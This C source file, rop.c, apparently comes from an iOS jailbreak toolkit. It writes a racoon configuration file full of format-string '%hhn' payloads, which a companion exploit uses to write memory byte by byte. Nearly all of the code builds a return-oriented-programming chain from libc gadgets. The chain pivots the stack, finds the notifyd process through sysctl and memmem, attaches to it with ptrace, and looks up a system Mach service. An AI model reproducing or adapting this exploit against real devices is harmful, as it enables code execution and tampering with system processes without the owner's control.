/*
 * rop.c
 *
 *  Created on: Jan 12, 2012
 *      Author: posixninja
 */


#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <syslog.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/sysctl.h>
#include <servers/bootstrap.h>
#include <mach/mach.h>
#include <syslog.h>
/*
#include <Foundation/Foundation.h>
#include <sys/sysctl.h>
#include <sys/resource.h>
#include <spawn.h>
#include <stdio.h>
#include <sys/param.h>
#include <sys/mount.h>
#include <dlfcn.h>
#include <sandbox.h>
#include <launch.h>
#include <errno.h>
#include <sys/stat.h>
#include "substrate.h"
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <signal.h>
#include <fcntl.h>
#include <libproc.h>
*/
#include "constants.h"

unsigned int p3AddrLo = P3_ADDR_LO;
unsigned int p2DataLo = 0, p3Data = 0;
int firstP2Write = 1, firstP3Write = 1;
int lines = 0;

typedef unsigned int Addr;
#define ROP_MODE_MEM 1
#define ROP_MODE_FILE 2
FILE* ropFile = NULL;
FILE* ropVarsFile = NULL;
unsigned int ropWriteMode = ROP_MODE_MEM;
unsigned int ropWriteVarsMode = ROP_MODE_MEM;
unsigned int ropWriteAddr = ROP2_ABS_ADDR;
unsigned int ropFileAddr;
unsigned char vars[VARS_MAX_SIZE];
Addr varsBaseAddr = VARS_ABS_ADDR_1;
unsigned int varsWritten = 0;

short fsgetPadding(unsigned char data) {
	int i, v = 1;
	for (i = 0; i < 10; i++) {
		v = v * 10;
		if (lines < v) break;
	}
	short ret = data - LOG_SHIFT - i;
	if (ret < 10) ret += 256;
	return ret;
}

void fswriteByte(int param, unsigned char data) {
	lines++;
	FILE* fd = fopen("racoon-exploit.conf", "a");
	if(fd != NULL) {
		fprintf(fd, "\tmy_identifier user_fqdn \"%%%du%%%d$hhn\";\n", fsgetPadding(data), param);
		close(fd);
	}
}

void setP3Data(unsigned int data) {
	// The idea is to change p2Data lowest byte to p3AddrLo, p3AddrLo+1, p3AddrLo+2, p3AddrLo+3.
	// This way, 'data' is written to p3Data, byte per byte.
	unsigned int p3ByteAddr, i = 0;
	for (p3ByteAddr = p3AddrLo; p3ByteAddr < p3AddrLo+4; p3ByteAddr++) {
		unsigned char p3DataByte = (data >> (i * 8)) & 0xff;
		unsigned int p3DataOr = p3DataByte << (i * 8);
		unsigned int p3DataMask = 0xff << (i * 8);

		if (firstP3Write || (p3Data & p3DataMask) != p3DataOr) {
			unsigned char newP2DataLo = p3ByteAddr & 0xff;
			if (firstP2Write || p2DataLo != newP2DataLo) {
				fswriteByte(P1, newP2DataLo);
				p2DataLo = newP2DataLo; // this is the operation we're doing to p2Data
				firstP2Write = 0;
			}

			fswriteByte(P2, p3DataByte);
			p3Data = p3Data & ~p3DataMask;
			p3Data = p3Data | p3DataOr; // this is the operation we're doing to p3Data
		}

		i++;
	}
	firstP3Write = 0;
}

void setP3DataEx(unsigned char p3AddrLo, unsigned int data) {
	// The idea is to change p2Data lowest byte to p3AddrLo, p3AddrLo+1, p3AddrLo+2, p3AddrLo+3.
	// This way, 'data' is written to p3Data, byte per byte.
	unsigned int p3ByteAddr, i = 0;
	for (p3ByteAddr = p3AddrLo; p3ByteAddr < p3AddrLo + 4; p3ByteAddr++) {
		unsigned char p3DataByte = (data >> (i * 8)) & 0xff;
		unsigned char newP2DataLo = p3ByteAddr & 0xff;
		fswriteByte(P1, newP2DataLo);
		fswriteByte(P2, p3DataByte);
		i++;
	}
}

void fsWrite(unsigned int addr, unsigned char data) {
	setP3Data(addr);
	// Then p3 will be used to write 'data' to 'addr'
	fswriteByte(P3, data & 0xff);
}

void fsWriteAddrRel(unsigned char addrLo, unsigned int data) {
	setP3DataEx(addrLo, data);
}

void ropWrite(unsigned int value) {
	//fprintf(stderr, "0x%08x: 0x%08x\n", ropWriteAddr, value);
	if (ropWriteMode == ROP_MODE_MEM) {
		if (value == USELESS || value == PLACE_HOLDER) {
			ropWriteAddr += 4;
		} else {
			fsWrite(ropWriteAddr++, value & 0xff);
			fsWrite(ropWriteAddr++, (value>>8) & 0xff);
			fsWrite(ropWriteAddr++, (value>>16) & 0xff);
			fsWrite(ropWriteAddr++, (value>>24) & 0xff);
		}
	} else {
		if (ropFile == NULL) {
			ropFile = fopen(ROP_FILE_NAME, "wb");
			ropFileAddr = ropWriteAddr;
		}
		if (ropWriteAddr != ropFileAddr) fseek(ropFile, ropWriteAddr - ropFileAddr, SEEK_CUR);
		fwrite(&value, 1, 4, ropFile);
		ropWriteAddr += 4;
		ropFileAddr = ropWriteAddr;
	}
}

void ropWriteVars() {
	if (ropWriteVarsMode == ROP_MODE_MEM) {
		unsigned int i;
		Addr addr = varsBaseAddr;
		for (i = 0; i < varsWritten; i++) {
			fsWrite(addr, vars[i]);
			addr++;
		}
	} else {
		if (ropVarsFile == NULL) {
			ropVarsFile = fopen(VARS_FILE_NAME, "wb");
		}
		fwrite(vars, 1, varsWritten, ropVarsFile);
	}
	fprintf(stderr, "Vars end address: 0x%08x\n", varsBaseAddr + varsWritten);
	varsWritten = 0;
	memset(vars, 0, VARS_MAX_SIZE);
}

Addr newBinary(void* data, size_t size) {
        while (varsWritten%4!=0) varsWritten++;
	Addr ret = varsBaseAddr + varsWritten;
        memcpy(&vars[varsWritten], data, size);
        varsWritten += size;
	return ret;
}

Addr newString(char* s) {
        while (varsWritten%4!=0) varsWritten++;

	Addr ret = varsBaseAddr + varsWritten;
        strcpy(&vars[varsWritten], s);
        varsWritten += strlen(s) + 1;
        return ret;
}

Addr newInteger(unsigned int value) {
        while (varsWritten%4!=0) varsWritten++;

	Addr ret = varsBaseAddr + varsWritten;
	vars[varsWritten++] = value & 0xff;
	vars[varsWritten++] = (value>>8) & 0xff;
	vars[varsWritten++] = (value>>16) & 0xff;
	vars[varsWritten++] = (value>>24) & 0xff;
	return ret;
}

Addr newBuffer(unsigned int size) {
        while (varsWritten%4!=0) varsWritten++;

	Addr ret = varsBaseAddr + varsWritten;
	varsWritten += size;
	return ret;
}

Addr newArray(unsigned int values[], unsigned int count) {
        while (varsWritten%4!=0) varsWritten++;

        int i;
        Addr ret = 0;
        for (i = 0; i < count; i++) {
                Addr tmp = newInteger(values[i]);
                if (ret == 0) ret = tmp;
        }
        return ret;
}

void ropOpen() {
	lines++;
	FILE* fd = fopen("racoon-exploit.conf", "w");
	if(fd != NULL) {
		fprintf(fd, "sainfo address ::1 icmp6 address ::1 icmp6 {\n");
		close(fd);
	}
	memset(vars, 0, VARS_MAX_SIZE);
}

void ropClose() {

	fprintf(stderr, "ROP end address: 0x%08x\n", ropWriteAddr);
	ropWriteVars();

	if (ropFile != NULL) fclose(ropFile);
	if (ropVarsFile != NULL) fclose(ropVarsFile);

	lines++;
	FILE* fd = fopen("racoon-exploit.conf", "a");
	if(fd != NULL) {
		fprintf(fd, "}\n");
		close(fd);
	}
}


unsigned int dscs;

void ropStackPivotLo(Addr toAddr) {
	fsWriteAddrRel(LR_ADDR_LO,		dscs + LIBC_POP_R47);			// 0x00 pc
	fsWriteAddrRel(LR_ADDR_LO + 0x4, 	toAddr);				// 0x04 r4
	fsWriteAddrRel(LR_ADDR_LO + 0x8, 	USELESS);				// 0x08 r7
	fsWriteAddrRel(LR_ADDR_LO + 0xc, 	dscs + LIBC_MOV_SP_R4__POP_R47);	// 0x0c pc
	ropWriteAddr = toAddr; // sp was changed
	ropWrite(USELESS);								// r4
	ropWrite(USELESS);								// r7
}

#define ROP_LOAD_REG4_CONST_LEN 0xc
void ropLoadReg4Const(unsigned int value) {
	ropWrite(dscs + LIBC_POP_R47);		// 0x00 pc
	ropWrite(value);			// 0x04 r4
	ropWrite(USELESS);			// 0x08 r7
}

#define ROP_LOAD_REG0_CONST_LEN 0x8
void ropLoadReg0Const(unsigned int value) {
	ropWrite(dscs + LIBC_POP_R0);		// 0x00 pc
	ropWrite(value);			// 0x04 r0
}

#define ROP_DEREF_REG0_LEN 0x8
void ropDerefReg0() {
	ropWrite(dscs + LIBC_LDR_R0_R0__POP_R7); // 0x00 pc
	ropWrite(USELESS);			// 0x04 r7
}

#define ROP_LOAD_REG0_LEN (ROP_LOAD_REG0_CONST_LEN + ROP_DEREF_REG0_LEN)
void ropLoadReg0(Addr ptrValue) {
	ropLoadReg0Const(ptrValue);
	ropDerefReg0();
}

#define ROP_SAVE_REG0_LEN (ROP_LOAD_REG4_CONST_LEN + 0xc)
void ropSaveReg0(Addr toAddr) {
	ropLoadReg4Const(toAddr);		// 0x00 pc
	ropWrite(dscs + LIBC_STR_R0_R4__POP_R47); // 0x0c pc
	ropWrite(USELESS);			// 0x10 r4
	ropWrite(USELESS);			// 0x14 r7
}

void ropSubReg0Const(unsigned int value) {
	ropLoadReg4Const(value);
	ropWrite(dscs + LIBC_SUB_R0_R4__POP_R4567); // 0x0c pc
	ropWrite(USELESS);			// 0x10 r4
	ropWrite(USELESS);			// 0x14 r5
	ropWrite(USELESS);			// 0x18 r6
	ropWrite(USELESS);			// 0x1c r7
}

void ropCall4Reg(Addr addr) {
	ropLoadReg4Const(addr);
	ropWrite(dscs + LIBC_BLX_R4_POP_R47);	// 0x0c pc
	ropWrite(USELESS);			// 0x10 r4
	ropWrite(USELESS);			// 0x14 r7
}

void ropCall6(Addr addr, unsigned int p1, unsigned int p2, unsigned int p3, unsigned int p4, unsigned int p5, unsigned int p6) {
	ropWrite(dscs + LIBC_POP_R0123);	// 0x00 pc
	ropWrite(p1);				// 0x04 r0
	ropWrite(p2);				// 0x08 r1
	ropWrite(p3);				// 0x0c r2
	ropWrite(p4);				// 0x10 r3
	ropLoadReg4Const(addr);
	ropWrite(dscs + LIBC_BLX_R4_POP_R47);	// 0x20 pc
	ropWrite(p5);				// 0x24 r4 (and p5)
	ropWrite(p6);				// 0x28 r7 (and p6)
}
void ropCall5(Addr addr, unsigned int p1, unsigned int p2, unsigned int p3, unsigned int p4, unsigned int p5) {
	ropCall6(addr, p1, p2, p3, p4, p5, USELESS);
}
void ropCall4(Addr addr, unsigned int p1, unsigned int p2, unsigned int p3, unsigned int p4) {
	ropCall6(addr, p1, p2, p3, p4, USELESS, USELESS);
}
void ropCall3(Addr addr, unsigned int p1, unsigned int p2, unsigned int p3) {
	ropCall6(addr, p1, p2, p3, USELESS, USELESS, USELESS);
}
void ropCall2(Addr addr, unsigned int p1, unsigned int p2) {
	ropCall6(addr, p1, p2, USELESS, USELESS, USELESS, USELESS);
}
void ropCall1(Addr addr, unsigned int p1) {
	ropCall6(addr, p1, USELESS, USELESS, USELESS, USELESS, USELESS);
}
void ropCall0(Addr addr) {
	ropCall6(addr, USELESS, USELESS, USELESS, USELESS, USELESS, USELESS);
}

void ropLog(char* msg) {
	ropCall2(dscs + _dsc_syslog, LOG_WARNING, newString(msg));
}

int ropMain(int slide) {
	dscs = slide;
	FILE* fd = fopen("racoon-exploit.conf", "a");
	if(fd != NULL) {
		close(fd);
	}

	// This is fucking crazy, we really need to split this up into function
	//  sized blocks, (ropPtrace, ropSyslog, ropEtc..),  and we need some
	//  for doing loops!
	// ~posixninja
	ropOpen();

	ropStackPivotLo(ROP2_ABS_ADDR);

	ropLog("Entering racoon ROP.\n");

	// search notifyd pid : ----------------------------------------
	static int name[] = {CTL_KERN, KERN_PROC, KERN_PROC_ALL};
	Addr aLength = newInteger(0);
	Addr aProc = newInteger(0);
	Addr aPid = newInteger(0);
	Addr aName = newArray(name, 3);
	ropCall6(dscs + _dsc_sysctl, aName, 3, 0, aLength, 0, 0);

	// ropMalloc(aLength);
	ropLoadReg0(aLength);
	ropCall4Reg(dscs + _dsc_malloc);

	// ropSysctl(aName, 3, aProc, aLength, 0, 9);
	ropSaveReg0(aProc);
	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x0c); // aProc to PLACE_HOLDER1
	ropCall6(dscs + _dsc_sysctl, aName, 3, PLACE_HOLDER, aLength, 0, 0);

	// ropMemmem(aProc, aLength, "\0\0notifyd", 9);
	ropLoadReg0(aProc);
	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN * 2 + ROP_LOAD_REG0_LEN + 0x04); // aProc to PLACE_HOLDER1
	ropLoadReg0(aLength);
	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x08); // aLength to PLACE_HOLDER2
	ropCall4(dscs + _dsc_memmem, PLACE_HOLDER, PLACE_HOLDER, newBinary("\0\0notifyd", 9), 9);

	ropSubReg0Const(137);
	ropDerefReg0();

	// ropSyslog(LOG_WARN, "notifyd pid: %d\n", aPid);
	ropSaveReg0(aPid);
	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x0c); // aPid to PLACE_HOLDER
	ropCall3(dscs + _dsc_syslog, LOG_WARNING, newString("notifyd pid: %d\n"), PLACE_HOLDER);

	// ropPtrace(PT_ATTACH, aPid, 0, 0);
	ropLoadReg0(aPid);
	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x08); // aPid to PLACE_HOLDER
	ropCall4(dscs + _dsc_ptrace, PT_ATTACH, PLACE_HOLDER, 0, 0);
	ropLog("attached to notifyd\n");

	// ropSleep(1);
	ropLog("sleeping...");
	ropLoadReg0(1);
	ropCall1(dscs + _dsc_sleep, 1);

	// ropPtrace(PT_CONTINUE, aPid, aAddr, 0);
	ropLoadReg0(aPid);
	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x08); // aPid to PLACE_HOLDER
	ropCall4(dscs + _dsc_ptrace, PT_CONTINUE, PLACE_HOLDER, _dsc_bsdthread_terminate, 0);
	ropLog("continuing...\n");

	// ropSleep(1);
	ropLog("sleeping...");
	ropCall1(dscs + _dsc_sleep, 1);

	// ropPtrace(PT_DETACH, aPid, 0, 0); // please???
	ropLoadReg0(aPid);
	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x08); // aPid to PLACE_HOLDER
	ropCall4(dscs + _dsc_ptrace, PT_DETACH, PLACE_HOLDER, 0, 0);
	ropLog("detached!!!\n");

	// ropSleep(1);
	ropLog("sleeping...");
	ropCall1(dscs + _dsc_sleep, 1);

	// ropBootstrapLookUp(bootstrap_port, "com.apple.system.notification_center", &aPort);
    Addr aPort = newInteger(0);
    ropLoadReg0(aPort);
    ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0xc);
    ropCall3(dscs + _dsc_bootstrap_look_up, bootstrap_port, newString("com.apple.system.notification_center"), PLACE_HOLDER);
    ropLog("Looked up notification center\n");

	// -------------------------------------------------------------

	ropLog("Racoon ROP ended.\n");
	ropCall1(dscs + _dsc_exit, 0);

	ropClose();
}
